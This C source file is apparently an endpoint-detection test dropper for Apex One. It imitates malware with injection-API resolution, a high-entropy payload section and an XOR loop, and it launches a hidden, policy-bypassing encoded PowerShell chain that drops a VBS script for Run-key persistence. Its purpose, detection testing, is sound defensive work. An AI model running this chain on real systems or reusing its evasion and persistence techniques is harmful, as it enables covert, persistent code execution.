/*
 * pml_dropper_stub.c
 * ─────────────────────────────────────────────────────────────────────────────
 * Purpose   : File-detection trigger for Apex One PML test
 * Role      : Stage-1 PE — triggers ATSE + PML File Model, then launches
 *             behavioral chain for CIE + PML Process Model
 *
 * Static signals (ATSE scans these before execution):
 *   [1] Import table  : VirtualAlloc, WriteProcessMemory, CreateRemoteThread
 *   [2] Dynamic import: LoadLibrary -> GetProcAddress resolution chain
 *   [3] .payload      : 512-byte section, Shannon entropy ~7.95 bpb
 *   [4] XOR opcode    : tight XOR loop matching packer stub signatures
 *   [5] Unsigned PE   : no Authenticode, no version resource, no manifest
 *   [7] Overlay bytes : appended post-build (dropper/binder pattern)
 *
 * Behavioral chain (CIE observes after execution):
 *   PE -> cmd.exe -> powershell.exe (-NoProfile -Hidden -Bypass -EncodedCommand)
 *      -> wscript.exe pml_s3.vbs (HKCU Run persistence + drop JScript)
 *      -> cscript.exe pml_s4.js  (3rd engine: completion marker)
 *
 * CONTROLLED TEST ARTIFACT - no actual injection or shellcode executed.
 */
#include <windows.h>
#include <stdio.h>
#include <string.h>

/* Suspicious API typedefs - presence in import resolution chain is the signal.
 * ATSE maps these against injection/loader capability fingerprints.
 * None are invoked with real targets.
 */
typedef LPVOID  (WINAPI *pfnVirtualAlloc)       (LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *pfnWriteProcessMemory) (HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
typedef HANDLE  (WINAPI *pfnCreateRemoteThread) (HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T,
                                                 LPTHREAD_START_ROUTINE, LPVOID,
                                                 DWORD, LPDWORD);
typedef BOOL    (WINAPI *pfnVirtualProtect)     (LPVOID, SIZE_T, DWORD, PDWORD);

/* High-entropy .payload section
 * 512 bytes XOR-scrambled pseudo-random data.
 * Shannon entropy: ~7.95 bpb.  ATSE flags sections > 7.0 as packed/encrypted.
 * Non-standard section name is a structural anomaly (packer artifact pattern).
 */
#pragma section(".payload", read, write)
__declspec(allocate(".payload"))
static const unsigned char g_payload[512] = {
    0x5C, 0x8F, 0xA5, 0x8F, 0x94, 0xBB, 0xFC, 0x9F, 0xEF, 0x85, 0x96, 0xDC, 0xD8, 0xD5, 0xD5, 0x0F,
    0xF4, 0x92, 0x10, 0xAC, 0x87, 0xF7, 0xA7, 0x16, 0x56, 0x1A, 0x9D, 0x0F, 0xCD, 0x07, 0xE2, 0xA8,
    0xFF, 0xB2, 0x93, 0xB7, 0xD1, 0x25, 0x7E, 0xBE, 0xFF, 0xAA, 0x37, 0x50, 0x4C, 0x1B, 0xDB, 0xA1,
    0xEB, 0xBA, 0x43, 0x10, 0xB7, 0x2F, 0x13, 0xC8, 0x15, 0xB5, 0x96, 0x07, 0x6C, 0x95, 0x47, 0xFD,
    0x0E, 0x80, 0xD8, 0x08, 0x62, 0x4E, 0xEB, 0xE0, 0x19, 0x21, 0xAF, 0x62, 0x8E, 0x83, 0xB5, 0xBC,
    0xA7, 0x21, 0xB8, 0x56, 0x91, 0x1A, 0x1A, 0xEF, 0x24, 0xF8, 0x0A, 0x96, 0x29, 0x78, 0xF6, 0xED,
    0x48, 0x62, 0xEA, 0x6A, 0xC3, 0xAE, 0x15, 0xA0, 0x47, 0x9B, 0xF2, 0x64, 0x39, 0x39, 0xF4, 0x90,
    0x9F, 0x8C, 0x85, 0xD4, 0x99, 0xA6, 0xEE, 0xDE, 0x0D, 0xE0, 0x4B, 0x51, 0x72, 0x83, 0xA9, 0xAC,
    0x2B, 0x55, 0xA8, 0x8F, 0xE0, 0xA8, 0x39, 0x03, 0xDE, 0x0C, 0xC8, 0x48, 0xBD, 0x2A, 0xE8, 0x0E,
    0x61, 0x57, 0x8C, 0x43, 0x29, 0xCD, 0xFA, 0xB9, 0x87, 0xA0, 0xD8, 0x5C, 0xFD, 0xCA, 0x79, 0x45,
    0xEB, 0xC6, 0x2A, 0x1E, 0xAE, 0x0E, 0xC5, 0xC1, 0xAE, 0x29, 0x3B, 0x91, 0x67, 0xAA, 0x19, 0x68,
    0xAC, 0xE8, 0xA9, 0x58, 0x44, 0x61, 0xE9, 0xAC, 0x5B, 0x5A, 0x66, 0x12, 0x76, 0xB1, 0xC0, 0x97,
    0x92, 0x3A, 0x68, 0x80, 0xE7, 0xDE, 0xB3, 0x20, 0x9D, 0x00, 0x91, 0x20, 0xD3, 0x88, 0x7A, 0x5E,
    0x99, 0xC3, 0x86, 0x4B, 0x88, 0xED, 0xC0, 0x77, 0x27, 0xD7, 0x7A, 0x62, 0x50, 0x89, 0xF5, 0x5F,
    0xEB, 0xD1, 0xB3, 0xC1, 0x0A, 0x1C, 0xD4, 0x14, 0x5D, 0x38, 0x2B, 0x33, 0xF2, 0x52, 0x0F, 0x01,
    0x5F, 0x8D, 0x8D, 0x28, 0x14, 0x46, 0x56, 0x51, 0xC8, 0x4E, 0xBE, 0xBC, 0x43, 0xD9, 0xEB, 0xE4,
    0x41, 0xBF, 0x67, 0x79, 0x46, 0xD3, 0xBA, 0x3D, 0x64, 0x05, 0xC7, 0x4D, 0x02, 0x34, 0x49, 0x11,
    0x88, 0x76, 0x4B, 0x3B, 0x06, 0xF8, 0xBE, 0xE0, 0x0F, 0x26, 0x65, 0x3C, 0x59, 0x2A, 0x02, 0x87,
    0x4E, 0x96, 0x4A, 0x8A, 0xCD, 0xA9, 0x09, 0x0E, 0x01, 0x1B, 0xC4, 0x3D, 0x9E, 0xAA, 0x17, 0x59,
    0xC6, 0xA3, 0x64, 0xAB, 0x23, 0x82, 0x25, 0x4D, 0xB5, 0x13, 0x04, 0x08, 0x6B, 0x9A, 0x4D, 0xB8,
    0x89, 0x97, 0x29, 0xE7, 0x2B, 0xAC, 0x93, 0x4B, 0xB6, 0x29, 0x2B, 0x09, 0xD0, 0x79, 0x67, 0xA9,
    0xD6, 0xF0, 0x5C, 0x8D, 0x2C, 0x1C, 0x88, 0xB4, 0x78, 0x9D, 0x6B, 0xF8, 0x72, 0x42, 0x37, 0x3C,
    0x43, 0xAD, 0x4B, 0xEA, 0xFB, 0x51, 0x5B, 0xF0, 0xB0, 0x13, 0x04, 0x41, 0x60, 0xB4, 0xE0, 0xF9,
    0x6C, 0x26, 0xDD, 0x4E, 0xB1, 0x2B, 0x80, 0x6E, 0x37, 0x86, 0xF2, 0x10, 0x8D, 0x73, 0xED, 0xFD,
    0xA2, 0x29, 0x66, 0x73, 0x26, 0x13, 0xCC, 0x48, 0x34, 0xBF, 0x37, 0x4F, 0x41, 0x0B, 0x4D, 0x35,
    0xE5, 0xA1, 0x20, 0xD9, 0x06, 0xF2, 0x1F, 0x88, 0x2A, 0x31, 0x7D, 0xB9, 0x53, 0xA0, 0x8F, 0x21,
    0xE4, 0x33, 0x3B, 0x09, 0x7C, 0x0A, 0x7B, 0x24, 0x3B, 0x23, 0x5C, 0x16, 0xAD, 0xDC, 0x56, 0x25,
    0x79, 0xC5, 0x17, 0x26, 0x1F, 0xD1, 0x87, 0x44, 0x63, 0x0E, 0x3D, 0x71, 0x93, 0x1B, 0xC2, 0x50,
    0xA2, 0x40, 0x03, 0xDD, 0xDB, 0x66, 0x79, 0x0C, 0x13, 0xD6, 0x0C, 0x8A, 0x2C, 0x5C, 0xA9, 0x15,
    0x57, 0x9D, 0xF2, 0x46, 0xA5, 0xB5, 0x5C, 0xF8, 0x9C, 0x84, 0x0C, 0x97, 0x18, 0x41, 0x97, 0x9D,
    0x75, 0x93, 0x43, 0xDB, 0x0B, 0x6A, 0x5F, 0x6B, 0x18, 0x0E, 0xF4, 0x4B, 0xA7, 0x78, 0x85, 0x56,
    0x58, 0x2B, 0x39, 0xB2, 0x67, 0xA1, 0xE8, 0xCA, 0x79, 0x56, 0xA1, 0x13, 0x03, 0x2F, 0x07, 0x0E
};

/* XOR decode stub
 * Tight loop + XOR byte ptr [reg], key  (opcode 0x30/0x32 per iteration).
 * Matches packer stub signatures used by Emotet, TrickBot, Ryuk.
 * noinline preserves opcode sequence against compiler optimisation.
 */
static __attribute__((noinline))
void xor_decode(unsigned char * restrict buf, size_t len, unsigned char key)
{
    size_t i;
    for (i = 0; i < len; ++i)
        buf[i] ^= key;
}

/* Encoded behavioral chain
 * cmd.exe /c powershell.exe -NoProfile -WindowStyle Hidden
 *                           -ExecutionPolicy Bypass -EncodedCommand <b64>
 * CIE signals: abnormal parent, hidden window, -BypassPolicy, -EncodedCommand.
 */
static const char g_enc[] = "JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACcAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAnAAoAJABkAD0AJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAKwAnAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACcACgBpAGYAKAAtAG4AbwB0ACgAVABlAHMAdAAtAFAAYQB0AGgAIAAkAGQAKQApAHsATgBlAHcALQBJAHQAZQBtACAALQBJAHQAZQBtAFQAeQBwAGUAIABEAGkAcgBlAGMAdABvAHIAeQAgAC0AUABhAHQAaAAgACQAZAAgAC0ARgBvAHIAYwBlAHwATwB1AHQALQBOAHUAbABsAH0ACgAkAHAAPQAkAGQAKwAnAFwAcABtAGwAXwBzADMALgB2AGIAcwAnAAoAJABiAD0AWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcASgB5AEIAUQBUAFUAdwBnAFYARwBWAHoAZABDAEEAdABJAEYATgAwAFkAVwBkAGwASQBEAE0AZwBLAEYAWgBDAFUAMgBOAHkAYQBYAEIAMABJAEMAOABnAGQAMwBOAGoAYwBtAGwAdwBkAEMANQBsAGUARwBVAHAAQwBpAGMAZwBVADIAbABuAGIAbQBGAHMAYwB6AG8AZwBTAEUAdABEAFYAVgB4AFMAZABXADQAZwBjAEcAVgB5AGMAMgBsAHoAZABHAFYAdQBZADIAVQBnAGYAQwBBAGwAUQBWAEIAUQBSAEUARgBVAFEAUwBVAGcAWgBIAEoAdgBjAEMAQgA4AEkASABkAHoAWQAzAEoAcABjAEgAUQB0AFAAbQBOAHoAWQAzAEoAcABjAEgAUQBnAGEARwA5AHcAQwBrADkAdwBkAEcAbAB2AGIAaQBCAEYAZQBIAEIAcwBhAFcATgBwAGQAQQBwAEUAYQBXADAAZwBjADIAZwBzAEkARwBaAHoATABDAEIAcQBjAEMAdwBnAFoAbQBnAEsAQwBsAE4AbABkAEMAQgB6AGEAQwBBADkASQBFAE4AeQBaAFcARgAwAFoAVQA5AGkAYQBtAFYAagBkAEMAZwBpAFYAMQBOAGoAYwBtAGwAdwBkAEMANQBUAGEARwBWAHMAYgBDAEkAcABDAGwATgBsAGQAQwBCAG0AYwB5AEEAOQBJAEUATgB5AFoAVwBGADAAWgBVADkAaQBhAG0AVgBqAGQAQwBnAGkAVQAyAE4AeQBhAFgAQgAwAGEAVwA1AG4ATABrAFoAcABiAEcAVgBUAGUAWABOADAAWgBXADEAUABZAG0AcABsAFkAMwBRAGkASwBRAG8ASwBKAHkAQQB0AEwAUwBCAFEAWgBYAEoAegBhAFgATgAwAFoAVwA1AGoAWgBUAG8AZwBTAEUAdABEAFYAUwBCAFMAZABXADQAZwBhADIAVgA1AEkAQwAwAHQAQwBuAE4AbwBMAGwASgBsAFoAMQBkAHkAYQBYAFIAbABJAEYAOABLAEkAQwBBAGcASQBDAEoASQBTADAATgBWAFgARgBOAHYAWgBuAFIAMwBZAFgASgBsAFgARQAxAHAAWQAzAEoAdgBjADIAOQBtAGQARgB4AFgAYQBXADUAawBiADMAZAB6AFgARQBOADEAYwBuAEoAbABiAG4AUgBXAFoAWABKAHoAYQBXADkAdQBYAEYASgAxAGIAbAB4AFEAVABVAHgAVQBaAFgATgAwAFUAMwBSADEAWQBpAEkAcwBJAEYAOABLAEkAQwBBAGcASQBDAEoAMwBjADIATgB5AGEAWABCADAATABtAFYANABaAFMAQQBpAEkAaQBJAGcASgBpAEIAWABVADIATgB5AGEAWABCADAATABsAE4AagBjAG0AbAB3AGQARQBaADEAYgBHAHgATwBZAFcAMQBsAEkAQwBZAGcASQBpAEkAaQBJAGkAdwBnAFgAdwBvAGcASQBDAEEAZwBJAGwASgBGAFIAMQA5AFQAVwBpAEkASwBDAGkAYwBnAEwAUwAwAGcAUgBIAEoAdgBjAEMAQgBUAGQARwBGAG4AWgBTAEEAMABJAEUAcABUAFkAMwBKAHAAYwBIAFEAZwBiAEcAbAB1AFoAUwAxAGkAZQBTADEAcwBhAFcANQBsAEkAQwAwAHQAQwBtAHAAdwBJAEQAMABnAGMAMgBnAHUAUgBYAGgAdwBZAFcANQBrAFIAVwA1ADIAYQBYAEoAdgBiAG0AMQBsAGIAbgBSAFQAZABIAEoAcABiAG0AZAB6AEsAQwBJAGwAVgBFAFYATgBVAEMAVQBpAEsAUwBBAG0ASQBDAEoAYwBjAEcAMQBzAFgAMwBNADAATABtAHAAegBJAGcAcABUAFoAWABRAGcAWgBtAGcAZwBQAFMAQgBtAGMAeQA1AFAAYwBHAFYAdQBWAEcAVgA0AGQARQBaAHAAYgBHAFUAbwBhAG4AQQBzAEkARABJAHMASQBGAFIAeQBkAFcAVQBwAEMAbQBaAG8ATABsAGQAeQBhAFgAUgBsAFQARwBsAHUAWgBTAEEAaQBMAHkAOABnAFUARQAxAE0ASQBGAFIAbABjADMAUQBnAEwAUwBCAFQAZABHAEYAbgBaAFMAQQAwAEkAQwBoAEsAVQAyAE4AeQBhAFgAQgAwAEkASABaAHAAWQBTAEIAagBjADIATgB5AGEAWABCADAATABtAFYANABaAFMAawBpAEMAbQBaAG8ATABsAGQAeQBhAFgAUgBsAFQARwBsAHUAWgBTAEEAaQBMAHkAOABnAFUAMgBsAG4AYgBtAEYAcwBPAGkAQQB6AGMAbQBRAGcAYwAyAE4AeQBhAFgAQgAwAEkARwBWAHUAWgAyAGwAdQBaAFMAQQBvAGMARwA5ADMAWgBYAEoAegBhAEcAVgBzAGIAQwBBAHQAUABpAEIAMwBjADIATgB5AGEAWABCADAASQBDADAAKwBJAEcATgB6AFkAMwBKAHAAYwBIAFEAcABJAGcAcABtAGEAQwA1AFgAYwBtAGwAMABaAFUAeABwAGIAbQBVAGcASQBuAFoAaABjAGkAQgB6AGEAQwBBAGcAUABTAEIAdQBaAFgAYwBnAFEAVwBOADAAYQBYAFoAbABXAEUAOQBpAGEAbQBWAGoAZABDAGcAbgBWADEATgBqAGMAbQBsAHcAZABDADUAVABhAEcAVgBzAGIAQwBjAHAATwB5AEkASwBaAG0AZwB1AFYAMwBKAHAAZABHAFYATQBhAFcANQBsAEkAQwBKADIAWQBYAEkAZwBaAG4ATQBnAEkARAAwAGcAYgBtAFYAMwBJAEUARgBqAGQARwBsADIAWgBWAGgAUABZAG0AcABsAFkAMwBRAG8ASgAxAE4AagBjAG0AbAB3AGQARwBsAHUAWgB5ADUARwBhAFcAeABsAFUAMwBsAHoAZABHAFYAdABUADIASgBxAFoAVwBOADAASgB5AGsANwBJAGcAcABtAGEAQwA1AFgAYwBtAGwAMABaAFUAeABwAGIAbQBVAGcASQBuAFoAaABjAGkAQgB6AFoAWABBAGcAUABTAEIAVABkAEgASgBwAGIAbQBjAHUAWgBuAEoAdgBiAFUATgBvAFkAWABKAEQAYgAyAFIAbABLAEQAawB5AEsAVABzAGkAQwBtAFoAbwBMAGwAZAB5AGEAWABSAGwAVABHAGwAdQBaAFMAQQBpAGQAbQBGAHkASQBIAFIAdwBJAEMAQQA5AEkASABOAG8ATABrAFYANABjAEcARgB1AFoARQBWAHUAZABtAGwAeQBiADIANQB0AFoAVwA1ADAAVQAzAFIAeQBhAFcANQBuAGMAeQBnAG4ASgBWAFIARgBUAFYAQQBsAEoAeQBrAGcASwB5AEIAegBaAFgAQQBnAEsAeQBBAG4AYwBHADEAcwBYADIAUgB2AGIAbQBVAHUAZABIAGgAMABKAHoAcwBpAEMAbQBaAG8ATABsAGQAeQBhAFgAUgBsAFQARwBsAHUAWgBTAEEAaQBkAG0ARgB5AEkASABSAHoASQBDAEEAOQBJAEcAWgB6AEwAawA5AHcAWgBXADUAVQBaAFgAaAAwAFIAbQBsAHMAWgBTAGgAMABjAEMAdwBnAE0AaQB3AGcAZABIAEoAMQBaAFMAawA3AEkAZwBwAG0AYQBDADUAWABjAG0AbAAwAFoAVQB4AHAAYgBtAFUAZwBJAG4AUgB6AEwAbABkAHkAYQBYAFIAbABUAEcAbAB1AFoAUwBnAG4AVQBFADEATQBJAEYATgAwAFkAVwBkAGwASQBEAFEAZwBZADIAOQB0AGMARwB4AGwAZABHAFUANgBJAEMAYwBnAEsAeQBCAHUAWgBYAGMAZwBSAEcARgAwAFoAUwBnAHAATABuAFIAdgBTAFYATgBQAFUAMwBSAHkAYQBXADUAbgBLAEMAawBwAE8AeQBJAEsAWgBtAGcAdQBWADMASgBwAGQARwBWAE0AYQBXADUAbABJAEMASgAwAGMAeQA1AEQAYgBHADkAegBaAFMAZwBwAE8AeQBJAEsAWgBtAGcAdQBRADIAeAB2AGMAMgBVAEsAQwBpAGMAZwBMAFMAMABnAFEAMwBKAHYAYwAzAE0AdABaAFcANQBuAGEAVwA1AGwASQBHAGgAdgBjAEQAbwBnAGQAMwBOAGoAYwBtAGwAdwBkAEMAQQB0AFAAaQBCAGoAYwAyAE4AeQBhAFgAQgAwAEkAQwAwAHQAQwBuAE4AbwBMAGwASgAxAGIAaQBBAGkAWQAzAE4AagBjAG0AbAB3AGQAQwA1AGwAZQBHAFUAZwBJAGkASQBpAEkAQwBZAGcAYQBuAEEAZwBKAGkAQQBpAEkAaQBJAGcATAB5ADkAdQBiADIAeAB2AFoAMgA4AGkATABDAEEAdwBMAEMAQgBVAGMAbgBWAGwAQwBnAD0APQAnACkACgBbAFMAeQBzAHQAZQBtAC4ASQBPAC4ARgBpAGwAZQBdADoAOgBXAHIAaQB0AGUAQQBsAGwAQgB5AHQAZQBzACgAJABwACwAJABiACkACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAnAHcAcwBjAHIAaQBwAHQALgBlAHgAZQAnACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIAYAAiACQAcABgACIAIgAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4ACgA=";

static BOOL launch_chain(void)
{
    STARTUPINFOA        si;
    PROCESS_INFORMATION pi;
    char                cmd[16384];

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
        "cmd.exe /c powershell.exe "
        "-NoProfile -WindowStyle Hidden "
        "-ExecutionPolicy Bypass "
        "-EncodedCommand %s",
        g_enc);

    return CreateProcessA(NULL, cmd, NULL, NULL,
                          FALSE, CREATE_NO_WINDOW,
                          NULL, NULL, &si, &pi);
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{
    HMODULE               hK32, hNt;
    pfnVirtualAlloc       pVA;
    pfnWriteProcessMemory pWPM;
    pfnCreateRemoteThread pCRT;
    pfnVirtualProtect     pVP;
    unsigned char         scratch[16];

    (void)hPrev; (void)lpCmd; (void)nShow;

    /* Dynamic import resolution
     * LoadLibraryA -> GetProcAddress(suspicious API) pattern.
     * CIE telemetry observes this as a reflective-loader / injector hallmark,
     * even when the resolved functions are not subsequently invoked.
     */
    hK32 = LoadLibraryA("kernel32.dll");
    hNt  = LoadLibraryA("ntdll.dll");
    pVA  = (pfnVirtualAlloc)       GetProcAddress(hK32, "VirtualAlloc");
    pWPM = (pfnWriteProcessMemory) GetProcAddress(hK32, "WriteProcessMemory");
    pCRT = (pfnCreateRemoteThread) GetProcAddress(hK32, "CreateRemoteThread");
    pVP  = (pfnVirtualProtect)     GetProcAddress(hK32, "VirtualProtect");

    /* Keep symbols reachable - prevent linker from stripping them */
    (void)hNt; (void)pVA; (void)pWPM; (void)pCRT; (void)pVP;

    /* XOR stub: decode 16 bytes of g_payload - emits opcode pattern */
    memcpy(scratch, g_payload, sizeof(scratch));
    xor_decode(scratch, sizeof(scratch), 0x55);
    (void)scratch;

    /* Launch behavioral chain */
    if (!launch_chain())
        return 1;

    /* Stay alive so CIE can record parent-child linkage */
    Sleep(5000);
    return 0;
}
